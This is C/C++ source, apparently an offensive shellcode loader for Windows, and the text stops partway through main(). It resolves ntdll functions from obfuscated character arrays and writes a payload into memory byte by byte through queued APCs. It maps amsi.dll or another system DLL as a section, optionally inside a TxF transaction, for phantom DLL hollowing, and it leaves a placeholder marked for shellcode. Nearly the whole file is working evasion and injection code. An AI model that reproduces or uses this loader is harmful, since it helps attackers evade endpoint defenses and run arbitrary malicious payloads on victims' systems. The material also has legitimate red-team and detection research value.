typedef LONG(__stdcall* NtCreateSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
// typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);

typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);

typedef NTSTATUS (__stdcall* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection);


// Prototype for NtWaitForSingleObject
typedef NTSTATUS (__stdcall* NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);


LdrLoadDll_t LdrLoadDll;
NtCreateSection_t NtCreateSection;
NtMapViewOfSection_t NtMapViewOfSection;
NtCreateTransaction_t NtCreateTransaction;
NtProtectVirtualMemory_t NtProtectVirtualMemory;
NtWaitForSingleObject_t MyNtWaitForSingleObject;


const wchar_t essentialLibW[] = { L'n', L't', L'd', L'l', L'l', 0 };
// Load NT functions
void LoadNtFunctions() {
    dynamic::resolve_imports();
    // Load Library is not a necessity here:
    HMODULE hNtdll = dynamic::loadFuture(essentialLibW);
    // HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");

    const char crucialLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    const char NtCreateFutureStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtFutureTranscationStr[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'r', 'a', 'n', 's', 'a', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtViewFutureStr[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', 0 };
    const char NtProtectFutureMemoryStr[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char LdrLoadDllStr[] = { 'L', 'd', 'r', 'L', 'o', 'a', 'd', 'D', 'l', 'l', 0 };
    const char NtwaitForSingleObjectStr[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    //we should output 

    NtCreateSection = (NtCreateSection_t) _import_crucial(NtCreateFutureStr, NtCreateSection_t);
    NtMapViewOfSection = (NtMapViewOfSection_t) _import_crucial(NtViewFutureStr, NtMapViewOfSection_t);
    NtCreateTransaction = (NtCreateTransaction_t) _import_crucial(NtFutureTranscationStr, NtCreateTransaction_t);
    NtProtectVirtualMemory = (NtProtectVirtualMemory_t) _import_crucial(NtProtectFutureMemoryStr, NtProtectVirtualMemory_t);
    LdrLoadDll = (LdrLoadDll_t) _import_crucial(LdrLoadDllStr, LdrLoadDll_t);
    MyNtWaitForSingleObject = (NtWaitForSingleObject_t) _import_crucial(NtwaitForSingleObjectStr, NtWaitForSingleObject_t);
    // NtCreateSection = (NtCreateSection_t)dynamic::NotGetProcAddress(hNtdll, NtCreateFutureStr);
    // NtMapViewOfSection = (NtMapViewOfSection_t)dynamic::NotGetProcAddress(hNtdll, NtViewFutureStr);
    // NtCreateTransaction = (NtCreateTransaction_t)dynamic::NotGetProcAddress(hNtdll, NtFutureTranscationStr);
}


/////////////////////////////////////// APC Write:

#define NT_CREATE_THREAD_EX_SUSPENDED 1
#define NT_CREATE_THREAD_EX_ALL_ACCESS 0x001FFFFF
// Declaration of undocumented functions and structures

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;


// typedef ULONG (NTAPI *NtQueueApcThread_t)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
typedef NTSTATUS (NTAPI *NtQueueApcThreadEx2_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine,
    PVOID SystemArgument1 OPTIONAL,
    PVOID SystemArgument2 OPTIONAL,
    PVOID SystemArgument3 OPTIONAL
);

typedef ULONG (NTAPI *NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);

// // Function to write memory using APCs with an option to choose the thread creation method
// DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread) {
//     HANDLE hThread = NULL;
//     NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueueApcThread");
//     void *pRtlFillMemory = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlFillMemory");

//     if (!pNtQueueApcThread || !pRtlFillMemory) {
//         printf("[-] Failed to locate required functions.\n");
//         return 1;
//     }

//     if (useRtlCreateUserThread) {
//         pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
//         if (!RtlCreateUserThread) {
//             printf("[-] Failed to locate RtlCreateUserThread.\n");
//             return 1;
//         }

//         CLIENT_ID ClientID;
//         NTSTATUS ntStatus = RtlCreateUserThread(
//             hProcess,
//             NULL, // SecurityDescriptor
//             TRUE, // CreateSuspended - not directly supported, handle suspension separately
//             0, // StackZeroBits
//             NULL, // StackReserved
//             NULL, // StackCommit
//             (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
//             NULL, // StartParameter
//             &hThread,
//             &ClientID);

//         if (ntStatus != STATUS_SUCCESS) {
//             printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
//             return 1;
//         }
//         printf("[+] RtlCreateUserThread succeeded\n");
//         // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
//         // SuspendThread(hThread);
//     } else {
//         NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
//         if (!pNtCreateThreadEx) {
//             printf("[-] Failed to locate NtCreateThreadEx.\n");
//             return 1;
//         }

//         ULONG status = pNtCreateThreadEx(
//             &hThread,
//             NT_CREATE_THREAD_EX_ALL_ACCESS,
//             NULL,
//             hProcess,
//             (PVOID)(ULONG_PTR)ExitThread,
//             NULL,
//             NT_CREATE_THREAD_EX_SUSPENDED,
//             0,
//             0,
//             0,
//             NULL);

//         if (status != 0) {
//             printf("[-] Failed to create remote thread: %lu\n", status);
//             return 1;
//         }
//         printf("[+] NtCreateThreadEx succeeded\n");
//     }

//     // Write memory using APCs
//     for (DWORD i = 0; i < dwLength; i++) {
//         BYTE byte = pData[i];

//         // Print only for the first and last byte
//         if (i == 0 || i == dwLength - 1) {
//             printf("[+] Writing byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
//         }
//         ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
//         if (result != STATUS_SUCCESS) {
//             printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
//             TerminateThread(hThread, 0);
//             CloseHandle(hThread);
//             return 1;
//         }
//     }

//     // Resume the thread to execute queued APCs and then wait for completion
//     ResumeThread(hThread);
//     WaitForSingleObject(hThread, INFINITE);

//     printf("[+] APC write completed\n");
//     CloseHandle(hThread);
//     return 0;
// }

// Function to write memory using APCs with an option to choose the thread creation method
DWORD WriteProcessMemoryAPC(HANDLE hProcess, BYTE *pAddress, BYTE *pData, DWORD dwLength, BOOL useRtlCreateUserThread, BOOL bUseCreateThreadpoolWait) {
    HANDLE hThread = NULL;
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);

    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };
    // const char NtQueueFutureApcStr[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
    const char NtFillFutureMemoryStr[] = { 'R', 't', 'l', 'F', 'i', 'l', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    // NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcStr);
    NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
    void *pRtlFillMemory = (void*)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtFillFutureMemoryStr);


    // TODO, Change state: 
    pNtCreateThreadStateChange NtCreateThreadStateChange = (pNtCreateThreadStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateThreadStateChange"); 
    pNtChangeThreadState NtChangeThreadState = (pNtChangeThreadState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeThreadState");
    
    pNtCreateProcessStateChange NtCreateProcessStateChange = (pNtCreateProcessStateChange)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtCreateProcessStateChange");
    pNtChangeProcessState NtChangeProcessState = (pNtChangeProcessState)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "NtChangeProcessState");



    if (!pNtQueueApcThread || !pRtlFillMemory) {
        printf("[-] Failed to locate required functions.\n");
        return 1;
    }

    if(!bUseCreateThreadpoolWait){
        if (useRtlCreateUserThread) {
            pRtlCreateUserThread RtlCreateUserThread = (pRtlCreateUserThread)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "RtlCreateUserThread");
            if (!RtlCreateUserThread) {
                printf("[-] Failed to locate RtlCreateUserThread.\n");
                return 1;
            }

            CLIENT_ID ClientID;
            NTSTATUS ntStatus = RtlCreateUserThread(
                hProcess,
                NULL, // SecurityDescriptor
                TRUE, // CreateSuspended - not directly supported, handle suspension separately
                0, // StackZeroBits
                NULL, // StackReserved
                NULL, // StackCommit
                (PVOID)(ULONG_PTR)ExitThread, // StartAddress, using ExitThread as a placeholder
                NULL, // StartParameter
                &hThread,
                &ClientID);

            if (ntStatus != STATUS_SUCCESS) {
                printf("[-] RtlCreateUserThread failed: %x\n", ntStatus);
                return 1;
            }
            printf("[+] RtlCreateUserThread succeeded\n");
            // Immediately suspend the thread to mimic the NT_CREATE_THREAD_EX_SUSPENDED flag behavior
            // SuspendThread(hThread);
        } else {
            NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
            if (!pNtCreateThreadEx) {
                printf("[-] Failed to locate NtCreateThreadEx.\n");
                return 1;
            }

            ULONG status = pNtCreateThreadEx(
                &hThread,
                NT_CREATE_THREAD_EX_ALL_ACCESS,
                NULL,
                hProcess,
                (PVOID)(ULONG_PTR)ExitThread,
                NULL,
                NT_CREATE_THREAD_EX_SUSPENDED,
                0,
                0,
                0,
                NULL);

            if (status != 0) {
                printf("[-] Failed to create remote thread: %lu\n", status);
                return 1;
            }
            printf("[+] NtCreateThreadEx succeeded\n");
        }
    } else {
        hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
        if(!hThread) {
            printf("[-] Failed to open thread: %lu\n", GetLastError());
            return 1;
        }
        
    }


    // TODO: Change state:
    // HANDLE ThreadStateChangeHandle = NULL;
    // HANDLE duplicateThreadHandle = NULL;

    // BOOL success = DuplicateHandle(
    //     GetCurrentProcess(), // Source process handle
    //     hThread, // Source handle to duplicate
    //     GetCurrentProcess(), // Target process handle
    //     &duplicateThreadHandle, // Pointer to the duplicate handle
    //     THREAD_ALL_ACCESS, // Desired access (0 uses the same access as the source handle)
    //     FALSE, // Inheritable handle option
    //     0 // Options
    // );

    // NTSTATUS status = NtCreateThreadStateChange(
    //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
    //     MAXIMUM_ALLOWED,            // Define the access you need
    //     NULL,                      // ObjectAttributes, typically NULL for basic usage
    //     duplicateThreadHandle,              // Handle to the thread you're working with
    //     0                          // Reserved, likely 0 for most uses
    // );
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to create thread state change: %x\n", status);
    //     return 1;
    // } else {
    //     printf("[+] Thread state change created\n");
    // }   

    // status = NtChangeThreadState(ThreadStateChangeHandle, duplicateThreadHandle, 1, NULL, 0, 0);
    // if (status != STATUS_SUCCESS) {
    //     printf("[-] Failed to sus thread: %x\n", status);
    //     // return 1;
    // } else {
    //     printf("[+] Thread suspended\n");
    // };



    QUEUE_USER_APC_FLAGS apcFlags = bUseCreateThreadpoolWait ? QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC : QUEUE_USER_APC_FLAGS_NONE;

    for (DWORD i = 0; i < dwLength; i++) {
        BYTE byte = pData[i];

        // Print only for the first and last byte
        if (i == 0 || i == dwLength - 1) {
            printf("[+] Queue Apc Ex2 Writing byte 0x%02X to address %p\n", byte, (void*)((BYTE*)pAddress + i));
        }
        // no Ex:
        // ULONG result  = pNtQueueApcThread(hThread, pRtlFillMemory, pAddress + i, (PVOID)1, (PVOID)(ULONG_PTR)byte); 
        // if (result != STATUS_SUCCESS) {
        //     printf("[-] Failed to queue APC. NTSTATUS: 0x%X\n", result);
        //     TerminateThread(hThread, 0);
        //     CloseHandle(hThread);
        //     return 1;
        // }
        // Ex:
        NTSTATUS result = pNtQueueApcThread(
        hThread, // ThreadHandle remains the same
        NULL, // UserApcReserveHandle is not used in the original call, so pass NULL
        apcFlags, // Whatever you like 
        pRtlFillMemory, // ApcRoutine remains the same
        (PVOID)(pAddress + i), // SystemArgument1: Memory address to fill, offset by i, as before
        (PVOID)1, // SystemArgument2: The size argument for RtlFillMemory, as before
        (PVOID)(ULONG_PTR)byte // SystemArgument3: The byte value to fill, cast properly, as before
        );
        if (result != STATUS_SUCCESS) {
            printf("[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\n", result);
            TerminateThread(hThread, 0);
            CloseHandle(hThread);
            return 1;
        } else {
            // printf("[+] APC Ex2 queued successfully\n");
        }

    }

    // Resume the thread to execute queued APCs and then wait for completion
    if(!bUseCreateThreadpoolWait){


        // TODO, Change state: 
        /// print the address of above functions: 
        // printf("[+] NtCreateThreadStateChange: %p\n", NtCreateThreadStateChange);
        // printf("[+] NtChangeThreadState: %p\n", NtChangeThreadState);
        // printf("[+] NtCreateProcessStateChange: %p\n", NtCreateProcessStateChange);
        // printf("[+] NtChangeProcessState: %p\n", NtChangeProcessState);

        // HANDLE ThreadStateChangeHandle = NULL;
        // NTSTATUS status = NtCreateThreadStateChange(
        //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
        //     MAXIMUM_ALLOWED,            // Define the access you need
        //     NULL,                      // ObjectAttributes, typically NULL for basic usage
        //     hThread,              // Handle to the thread you're working with
        //     0                          // Reserved, likely 0 for most uses
        // );
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to create thread state change: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread state change created\n");
        // }   
        
        // NTSTATUS status = NtCreateProcessStateChange(
        //     &ThreadStateChangeHandle, // This handle is used in NtChangeThreadState
        //     MAXIMUM_ALLOWED,            // Define the access you need
        //     NULL,                      // ObjectAttributes, typically NULL for basic usage
        //     hProcess,              // Handle to the thread you're working with
        //     0                          // Reserved, likely 0 for most uses
        // );
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to create process state change: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process state change created\n");
        // }
        // status = NtChangeThreadState(ThreadStateChangeHandle, duplicateThreadHandle, 2, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume thread: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread resumed\n");
        // };

        // print the ThreadStateChangeHandle->ThreadSuspendCount
        // getchar();
        // status = NtChangeThreadState(ThreadStateChangeHandle, hThread, 2, 0, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume thread: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Thread resumed\n");
        // };

        // status = NtChangeProcessState(ThreadStateChangeHandle, hProcess, 0, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume process: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process resumed\n");
        // };

        // status = NtChangeProcessState(ThreadStateChangeHandle, hProcess, 1, NULL, 0, 0);
        // if (status != STATUS_SUCCESS) {
        //     printf("[-] Failed to resume process: %x\n", status);
        //     return 1;
        // } else {
        //     printf("[+] Process resumed\n");
        // };

        DWORD count = ResumeThread(hThread);
        printf("[+] Resuming thread: %lu\n", count);
        WaitForSingleObject(hThread, INFINITE);
        printf("[+] press any key to continue\n");
        getchar();
    } else {
        // Create a thread pool wait object
        PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)pRtlFillMemory, NULL, NULL);
        // PTP_WAIT ptpWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)ExitThread, NULL, NULL);

        if (ptpWait == NULL) {
            printf("[-] Failed to create thread pool wait object: %lu\n", GetLastError());
            return 1;
        }

        // Associate the wait object with the thread pool
        SetThreadpoolWait(ptpWait, event, NULL);
        printf("[+] Thread pool wait object created\n");
        // WaitForSingleObject(event, INFINITE);
        WaitForThreadpoolWaitCallbacks(ptpWait, FALSE);
        // CreateThreadpoolWait
        // SetThreadpoolWait
        // WaitForThreadpoolWaitCallbacks
        // CloseThreadpoolWait
    }   

    printf("[+] APC write completed\n");

    if(!bUseCreateThreadpoolWait){
        /// The code below is not necessary, however, provided an "insurance".
        /// alert test need a alertable thread, which means if thread is alerted, we need resume thread to 
        /// make it alertable again. 
        // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pAddress;
        // myNtTestAlert testAlert = (myNtTestAlert)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert");
        // NTSTATUS result = pNtQueueApcThread(
        //     hThread,  
        //     NULL,  
        //     apcFlags,  
        //     (PVOID)apcRoutine,  
        //     (PVOID)0,  
        //     (PVOID)0,  
        //     (PVOID)0 
        //     );

        // if(!testAlert) {
        //     printf("[-] Failed to locate alert test nt.\n");
        //     return 1;
        // } else {
        //     printf("[+] Alert tested\n");
        // }
    }

    // CloseHandle(hThread);
    return 0;
}


////////////////////////////////////////

unsigned char magiccode[] = ####SHELLCODE####;

int main(int argc, char *argv[])
{

    //get current process id: 
    DWORD pid = GetCurrentProcessId();
    //print pid in colour:
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hConsole == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Error getting console handle\n");
        return 1;
    }

    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
    printf("[+] Current Process ID: %lu\n", pid);
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    // printf("Starting program...\n");

    // printf("[+] MagicCode size: %lu bytes\n", sizeof(magiccodeNot));
    // //print the first few and last few bytes of magiccodeNot for verifiation:
    // printf("[+] First few bytes of magiccodeNot: ");
    // for (int i = 0; i < 128; i++) {
    //     printf("%02X ", magiccodeNot[i]);
    // }
    // printf("\n");
    // //last few bytes?
    // printf("[+] Last few bytes of magiccodeNot: ");
    // for (int i = sizeof(magiccodeNot) - 16; i < sizeof(magiccodeNot); i++) {
    //     printf("%02X ", magiccodeNot[i]);
    // }
    // printf("\n");
    // if(sizeof(*UUIDs[0]) == 8){
    //     printf("[+] UUIDs size: %lu bytes\n", sizeof(UUIDs));
    // } else {
    //     printf("[-] UUIDs size: %lu bytes\n", sizeof(UUIDs));
    // }




    /// Essential line: 
    // constexpr int numUuids = sizeof(UUIDs) / sizeof(UUIDs[0]);    
    // unsigned char magiccode[numUuids * 16];
    // unsigned char* magiccodePtr = magiccode;
    // convertUUIDsToMagicCode(UUIDs, magiccodePtr, numUuids);
    // ///Essential lines: 

    // printf("[+] MagicCodePtr size: %lu bytes\n", sizeof(magiccodePtr));
    // printf("[+] size of magiccode: %lu bytes\n", sizeof(magiccode));
    // essential line:
    



    // // Convert each UUID to binary and store in magicCode
    // for (int i = 0; i < numUuids; i++) {
    //     unsigned char bytes[16];
    //     customUuidFromString(UUIDs[i], bytes);
    //     memcpy(magiccode + (i * 16), bytes, 16);
    // }



    
    // unsigned char magiccode[] 
    // unsigned char magiccode = convertUUIDsToMagicCode(UUIDs);
    // convertUUIDsToMagicCode(UUIDs, magiccode);
//print the first few and last few bytes of magiccode for verifiation:
    // printf("[+] First few bytes of magiccode: ");
    // for (int i = 0; i < 128; i++) {
    //     printf("%02X ", magiccode[i]);
    // }
    // printf("\n");
    // printf("[+] Last few bytes of magiccode: ");
    // for (int i = numUuids * 16 - 16; i < numUuids * 16; i++) {
    //     printf("%02X ", magiccode[i]);
    // }
    // printf("\n");
    //pritn the size of magiccode using sizeof:
    // size_t arraySize = sizeof(magiccode); // Calculate the size separately

    // printf("[+] Size of magiccode: %lu bytes\n", arraySize);
    

    // // Open the DLL file to read headers
    // HANDLE fileHandle = CreateFile("C:\\windows\\system32\\amsi.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (fileHandle == INVALID_HANDLE_VALUE) {
    //     printf("Failed to open DLL file. Error: %lu\n", GetLastError());
    //     return 1;
    // } else {
	// 	printf("[+] DLL file amsi.dll opened.\n");
	// }

    // HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    // if (fileMapping == NULL) {
    //     printf("Failed to create file mapping. Error: %lu\n", GetLastError());
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapping created.\n");
	// }

    // LPVOID fileBase = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    // if (fileBase == NULL) {
    //     printf("Failed to map view of file. Error: %lu\n", GetLastError());
    //     CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     return 1;
    // } else {
	// 	printf("[+] File mapped.\n");
	//  }




    // Default value for bTxF
    BOOL bTxF = FALSE, bUseCustomDLL = FALSE; // Flag to indicate whether to search for a suitable DLL
    int dllOrder = 1; // Default to the first suitable DLL

    BOOL bUseRtlCreateUserThread = FALSE, bUseCreateThreadpoolWait = FALSE; // Default to FALSE
    BOOL bUseLdrLoadDll = FALSE; // Default to FALSE
    BOOL bUseDotnet = FALSE; // Default to FALSE

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0) {
            PrintUsageAndExit();
            return 0; // Assuming PrintUsageAndExit() does not exit the program
        }
        
        if (i + 1 < argc && strcmp(argv[i], "-dll") == 0) {
            dllOrder = atoi(argv[i + 1]);
            bUseCustomDLL = TRUE;
            i++; // Skip next argument as it's already processed
        } else if (strcmp(argv[i], "-txf") == 0) {
            bTxF = TRUE;
        } else if (strcmp(argv[i], "-thread") == 0) {
            bUseRtlCreateUserThread = TRUE;
        } else if (strcmp(argv[i], "-pool") == 0) {
            bUseCreateThreadpoolWait = TRUE;
        } else if (strcmp(argv[i], "-ldr") == 0) {
            bUseLdrLoadDll = TRUE;
        } else if (strcmp(argv[i], "-dotnet") == 0) {
            if(bUseCustomDLL) {
                bUseDotnet = TRUE;
            } else {
                printf("[-] -dotnet flag can only be used after -dll flag. Exiting.\n");
                return 1;
            }
        } else {
            printf("[-] Invalid argument: %s\n", argv[i]);
            return 1;
        }

        // Check for mutual exclusivity early
        if (bUseCreateThreadpoolWait && bUseRtlCreateUserThread) {
            printf("[-] Both -thread and -pool flags cannot be used together. Exiting.\n");
            return 1;
        }
    }


    if(bUseCreateThreadpoolWait) {
        printf("[+] Using CreateThreadpoolWait function.\n");
    } else {
        // print whether use alternative thread calling function, printf which method will be used:
        printf("[+] Using %s thread calling function.\n", bUseRtlCreateUserThread ? "RtlCreateUserThread" : "NtCreateThreadEx");
    }

    // Display debug message about transaction mode
    printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");

    LoadNtFunctions(); // Load the NT functions

    wchar_t dllPath[MAX_PATH] = {0}; // Buffer to store the path of the chosen DLL

    // bool useDotnet = TRUE; //This option can be made available to commandline options TODO: 
    if (bUseCustomDLL) {
        DWORD requiredSize = sizeof(magiccode); // Calculate the required size based on the magiccode array size
        printf("[+] Required size: %lu bytes\n", requiredSize);

        // Attempt to find a suitable DLL, now passing the calculated requiredSize
        if (!FindSuitableDLL(dllPath, sizeof(dllPath) / sizeof(wchar_t), requiredSize, bTxF, dllOrder, bUseDotnet)) {
            wprintf(L"[-] No suitable DLL found in the specified order. Falling back to default.\n");
            wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Default to amsi.dll
        } else {
            // wprintf(L"Using DLL: %s\n", dllPath);
        }
    } else {
        printf("[-] No custom DLL specified. Falling back to amsi.dll.\n");
        wcscpy_s(dllPath, L"C:\\windows\\system32\\amsi.dll"); // Use the default amsi.dll
    }

    wprintf(L"[+] Using DLL: %ls\n", dllPath);
    wprintf(L"[+] TxF Mode: %ls\n", bTxF ? L"Enabled" : L"Disabled");

    /// deal with TxF argument
    HANDLE fileHandle;
    if (bTxF) {
        OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
        HANDLE hTransaction;
        NTSTATUS NtStatus = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &ObjAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
        if (!NT_SUCCESS(NtStatus)) {
            printf("[-] Failed to create transaction (error 0x%x)\n", NtStatus);
            return 1;
        }

        // Display debug message about creating transaction
        printf("[+] Transaction created successfully.\n");

        fileHandle = CreateFileTransactedW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr, hTransaction, nullptr, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file transacted. Error: %lu\n", GetLastError());
            CloseHandle(hTransaction);
            return 1;
        }

        // Display debug message about opening DLL file transacted
        printf("[+] DLL file opened transacted successfully.\n");
    } else {
        fileHandle = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (fileHandle == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open DLL file. Error: %lu\n", GetLastError());
            return 1;
        }

        // Display debug message about opening DLL file
        printf("[+] DLL file opened successfully.\n");
    }

    LONG status = 0;
    HANDLE fileBase = NULL;
    HANDLE hSection = NULL;

    if(bUseLdrLoadDll) {
        printf("[+] Using LdrLoadDll function.\n");

        UNICODE_STRING UnicodeDllPath;
        ManualInitUnicodeString(&UnicodeDllPath, dllPath);
        NTSTATUS status = LdrLoadDll(NULL, 0, &UnicodeDllPath, &fileBase);

        if (NT_SUCCESS(status)) {
            printf("LdrLoadDll loaded successfully.\n");
        } else {
            printf("LdrLoadDll failed. Status: %x\n", status);
        }
    } else {

        printf("[+] Using Phantom DLL with missing PEB (NtCreateSection and NtMapViewOfSection).\n");
        // Create a section from the file
        // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
        if (status != 0) {
            printf("NtCreateSection failed. Status: %x\n", status);
            CloseHandle(fileHandle);
            return 1;
        }

        // Map the section into the process
        // PVOID fileBase = NULL;
        SIZE_T viewSize = 0;
        status = NtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID*)&fileBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
        if (status != 0) {
            printf("NtMapViewOfSection failed. Status: %x\n", status);
            CloseHandle(hSection);
            CloseHandle(fileHandle);
            return 1;
        }
    }






    // for NtCreateSection and NtMapViewOfSection
    // PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
